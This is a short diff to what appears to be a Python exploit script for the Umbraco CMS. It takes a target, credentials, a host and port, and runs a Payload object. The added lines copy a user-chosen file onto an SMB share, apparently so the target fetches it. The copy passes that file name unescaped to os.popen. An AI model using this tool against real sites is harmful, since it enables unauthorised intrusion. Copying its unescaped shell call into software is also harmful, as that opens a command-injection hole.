@@ -79,7 +79,11 @@ if __name__ == "__main__":
     parser.add_argument("--user", "-P", required=True, help="User name for Umbraco", type=str)
     parser.add_argument("--passw", "-U", required=True, help="Password for Umbraco", type=str)
     args = parser.parse_args()
-    
+   
     setup()
+
+    if args.load:
+        os.popen("cp {load} {dest}".format(load=args.load,dest=smb_pub_path))
+
     p = Payload(args.target, args.host, args.port, args.user, args.passw)
     p.execute()
